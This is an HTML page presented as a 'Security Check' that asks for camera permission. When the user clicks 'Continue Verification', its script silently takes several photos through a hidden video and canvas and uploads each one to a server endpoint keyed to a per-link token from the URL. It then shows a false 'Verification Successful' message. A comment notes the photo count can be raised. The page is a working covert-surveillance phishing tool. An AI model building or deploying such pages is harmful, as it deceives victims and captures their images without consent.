<!DOCTYPE html>
<html>
<head>
  <title>Security Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea, #764ba2);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .card {
      background: white;
      width: 90%;
      max-width: 360px;
      border-radius: 18px;
      padding: 25px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
    }

    .card img {
      width: 110px;
      margin-bottom: 15px;
    }

    h2 {
      font-size: 22px;
      color: #333;
    }

    p {
      font-size: 14px;
      color: #666;
    }

    button {
      margin-top: 25px;
      width: 100%;
      padding: 18px;
      border: none;
      border-radius: 40px;
      background: linear-gradient(135deg, #00c6ff, #0072ff);
      color: white;
      font-size: 20px;
      font-weight: bold;
      cursor: pointer;
    }

    .status {
      margin-top: 15px;
      font-size: 14px;
      font-weight: bold;
      color: green;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png">

    <h2>Security Check</h2>
    <p>Your camera will be used for verification.</p>

    <button id="verifyBtn">✅ Continue Verification</button>
    <div class="status" id="status"></div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const status = document.getElementById("status");
    const btn = document.getElementById("verifyBtn");

    const token = window.location.pathname.split("/").pop();

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => video.srcObject = stream)
      .catch(() => status.innerText = "Camera permission denied");

    btn.addEventListener("click", async () => {
      btn.disabled = true;
      status.innerText = "Verifying...";

      let photosCount = 6; // ✅ YAHAN 6 KI JAGAH 10 KAR SAKTE HO

      for (let i = 0; i < photosCount; i++) {
        await new Promise(r => setTimeout(r, 700)); // ✅ 0.7 sec gap

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve =>
          canvas.toBlob(resolve, "image/jpeg")
        );

        const form = new FormData();
        form.append("photo", blob);

        fetch("/api/upload/" + token, {
          method: "POST",
          body: form
        });
      }

      status.innerText = "✅ Verification Successful";
    });
  </script>

</body>
</html>
